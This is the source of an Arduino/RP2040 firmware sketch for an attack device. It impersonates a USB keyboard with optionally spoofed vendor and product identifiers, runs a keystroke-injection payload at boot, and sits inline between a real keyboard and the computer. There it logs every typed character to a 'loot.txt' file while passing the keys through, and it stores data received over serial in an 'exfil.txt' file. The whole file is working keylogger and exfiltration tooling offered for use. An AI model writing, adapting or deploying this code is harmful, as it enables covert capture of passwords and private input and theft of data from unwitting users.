#include <USBCrowKeyboard.h>
#include "payload.h"
#include "config.h"
#include <LittleFS.h> 
#include "pio_usb.h"
#include "Adafruit_TinyUSB.h"

#define HOST_PIN_DP   16

#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)
#define SHIFT   (0x80)
#define ALTGR   (0x40)

#define KEY_REPEAT_DELAY    500
#define KEY_REPEAT_INTERVAL  33

extern const uint8_t _asciimap[] PROGMEM;

// USB Host object
Adafruit_USBH_Host USBHost;

// holding device descriptor
tusb_desc_device_t desc_device;

static uint8_t mod = 0;
uint8_t modifiersard = 0;
uint8_t key;
uint8_t tmp_key;
int key_layout;
int key_modifier_layout;

// Key-repeat state (Core 1)
static hid_keyboard_report_t held_report     = { 0, 0, {0} };
static bool                  keys_held       = false;
static uint32_t              repeat_timer    = 0;
static bool                  in_repeat_phase = false;

// Helpers
static void logByte(uint8_t b) {
  if (b >= 32 && b <= 126) {
    File f = LittleFS.open("loot.txt", "a");
    if (f) {
      f.write(b);
      f.close();
    }
  }
}

void SetModifiersArd(void) {
  modifiersard = 0;
  if (mod == 2)  modifiersard = SHIFT;
  if (mod == 64) modifiersard = ALTGR;
}

static void dispatchKey(uint8_t k, uint8_t m) {
  if (m == 0 || m == MODIFIERKEY_LEFT_SHIFT || m == MODIFIERKEY_RIGHT_SHIFT) {
    switch (k) {
      case KEY_RETURN: // 40
        Keyboard.write('\n');
        logByte('\n');
        return;
      case 42: // BACKSPACE
        Keyboard.press(KEY_BACKSPACE);
        return;
      case 43: // TAB
        Keyboard.press(KEY_TAB);
        return;
      case 41: // ESC
        Keyboard.press(KEY_ESC);
        return;
      case 57: // CAPS LOCK
        Keyboard.press(KEY_CAPS_LOCK);
        return;
      case 70: // PRINT SCREEN
        Keyboard.press(KEY_PRINT_SCREEN);
        return;
      case 73: // INSERT
        Keyboard.press(KEY_INSERT);
        return;
      case 77: // END
        Keyboard.press(KEY_END);
        return;
      case 79: // RIGHT ARROW
        Keyboard.press(KEY_RIGHT_ARROW);
        return;
      case 80: // LEFT ARROW
        Keyboard.press(KEY_LEFT_ARROW);
        return;
      case 81: // DOWN ARROW
        Keyboard.press(KEY_DOWN_ARROW);
        return;
      case 82: // UP ARROW
        Keyboard.press(KEY_UP_ARROW);
        return;
      case 58: Keyboard.press(KEY_F1);  return;
      case 59: Keyboard.press(KEY_F2);  return;
      case 60: Keyboard.press(KEY_F3);  return;
      case 61: Keyboard.press(KEY_F4);  return;
      case 62: Keyboard.press(KEY_F5);  return;
      case 63: Keyboard.press(KEY_F6);  return;
      case 64: Keyboard.press(KEY_F7);  return;
      case 65: Keyboard.press(KEY_F8);  return;
      case 66: Keyboard.press(KEY_F9);  return;
      case 67: Keyboard.press(KEY_F10); return;
      case 68: Keyboard.press(KEY_F11); return;
      case 69: Keyboard.press(KEY_F12); return;
    }
  }

  if (k == 0 && m == MODIFIERKEY_LEFT_GUI) {
    Keyboard.press(KEY_LEFT_GUI);
    return;
  }

  if (m == 0) {
    for (int j = 0; j < 128; j++) {
      if (pgm_read_byte(_asciimap + j) == k) {
        Keyboard.write(j);
        logByte((uint8_t)j);
        return;
      }
    }
  } else {
    mod = m;
    SetModifiersArd();
    uint8_t km = k | modifiersard;
    for (int j = 0; j < 128; j++) {
      if (pgm_read_byte(_asciimap + j) == km) {
        logByte((uint8_t)j);
      }
    }
    Keyboard.rawpress(k, m);
    delay(10);
    Keyboard.rawrelease(k, m);
  }
}

static bool reportChanged(const hid_keyboard_report_t* a, const hid_keyboard_report_t* b) {
  if (a->modifier != b->modifier) return true;
  for (int i = 0; i < 6; i++) {
    if (a->keycode[i] != b->keycode[i]) return true;
  }
  return false;
}

static bool reportHasKeys(const hid_keyboard_report_t* r) {
  if (r->modifier) return true;
  for (int i = 0; i < 6; i++) {
    if (r->keycode[i]) return true;
  }
  return false;
}

static void dispatchReport(const hid_keyboard_report_t* r) {
  Keyboard.releaseAll();
  for (uint8_t i = 0; i < 6; i++) {
    if (r->keycode[i]) {
      dispatchKey(r->keycode[i], r->modifier);
    }
  }
  if (r->modifier && r->keycode[0] == 0) {
    dispatchKey(0, r->modifier);
  }
}

void process_boot_kbd_report(hid_keyboard_report_t const* report) {
  if (!KEYLOGGER) return;
  static hid_keyboard_report_t prev_report = { 0, 0, {0} };

  if (!reportChanged(report, &prev_report)) {
    return;
  }

  Keyboard.releaseAll();

  if (reportHasKeys(report)) {
    dispatchReport(report);
    held_report     = *report;
    keys_held       = true;
    in_repeat_phase = false;
    repeat_timer    = millis();
  } else {
    keys_held       = false;
    in_repeat_phase = false;
    mod             = 0;
  }
  prev_report = *report;
}

void handleKeyRepeat() {
  if (!keys_held) return;
  uint32_t now = millis();

  if (!in_repeat_phase) {
    if (now - repeat_timer >= KEY_REPEAT_DELAY) {
      in_repeat_phase = true;
      repeat_timer    = now;
      dispatchReport(&held_report);
    }
  } else {
    if (now - repeat_timer >= KEY_REPEAT_INTERVAL) {
      repeat_timer = now;
      dispatchReport(&held_report);
    }
  }
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();

  if (CHANGE_USB_CONFIG) {
    TinyUSBDevice.setID(vendor_id, product_id);
    TinyUSBDevice.setManufacturerDescriptor(manufacturer);
    TinyUSBDevice.setProductDescriptor(product); 
  }
  
  Keyboard.begin();
  delay(1000);

  if (PAYLOAD_RUN) {
    payload();
  }

  if (FORMATFS) {
    delay(10000);
    LittleFS.format();
    Serial.println("FS FORMAT: OK");
  }

  if (KEYLOGGER_VIEWLOG) {
    viewLogFile();
  }

  if (KEYLOGGER_DELETELOG) {
    delay(5500);
    File i = LittleFS.open("loot.txt", "w");
    if (i) {
      i.write("");
      Serial.println("KEYLOGGER DELETELOG: OK");
      i.close();
    }
  }

  if (EXFIL_VIEWLOG) {
    delay(10000);
    File i = LittleFS.open("exfil.txt", "r");
    Serial.println("EXFIL.TXT FILE:");
    if (i) {
      while (i.available()) Serial.write(i.read());
      i.close();
    }
  }

  if (EXFIL_DELETELOG) {
    delay(5500);
    File i = LittleFS.open("exfil.txt", "w");
    if (i) {
      i.write("");
      Serial.println("EXFIL DELETELOG: OK");
      i.close();
    }
  }
}

void loop() {
  if (EXFIL) {
    while (Serial.available()) {
      String airgap = Serial.readString();
      Serial.println(airgap);
      File f = LittleFS.open("exfil.txt", "a");
      if (f) {
        f.println(airgap);
        f.close();
      }
    }
  }
}

void setup1() { 
  if (KEYLOGGER) {
    Serial.println("Core1 setup to run TinyUSB host with pio-usb");

    uint32_t cpu_hz = clock_get_hz(clk_sys);
    if (cpu_hz != 120000000UL && cpu_hz != 240000000UL) {
      Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
      Serial.printf("Change your CPU Clock to either 120 or 240 Mhz in Menu->CPU Speed \r\n", cpu_hz);
    }

    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp = HOST_PIN_DP;
    USBHost.configure_pio_usb(1, &pio_cfg);
    USBHost.begin(1);
  }
}

void loop1() {
  if (KEYLOGGER) {
    USBHost.task();
    handleKeyRepeat();
  }
}

void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
  if (KEYLOGGER) {
    if (!tuh_hid_receive_report(dev_addr, idx)) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }  
  }
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
  uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);

  if (KEYLOGGER) {
    switch (itf_protocol) {
      case HID_ITF_PROTOCOL_KEYBOARD:
        process_boot_kbd_report((hid_keyboard_report_t const*) report);
        break;
    }

    if (!tuh_hid_receive_report(dev_addr, idx)) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }
  }
}

void viewLogFile() {
  if (KEYLOGGER_VIEWLOG) {
    delay(10000);
    File i = LittleFS.open("loot.txt", "r");
    Serial.println("=== LOOT.TXT FILE CONTENT ===");
    if (i) {
      while (i.available()) {
        uint8_t byteRead = i.read();
        if (byteRead >= 32 && byteRead <= 126) {
          Serial.print((char)byteRead);
        } else {
          Serial.print("[");
          if (byteRead < 16) Serial.print("0");
          Serial.print(byteRead, HEX);
          Serial.print("]");
        }
      }
      Serial.println();
      Serial.println("=== END OF FILE ===");
      i.close();
    } else {
      Serial.println("Error opening loot.txt");
    }
  }
}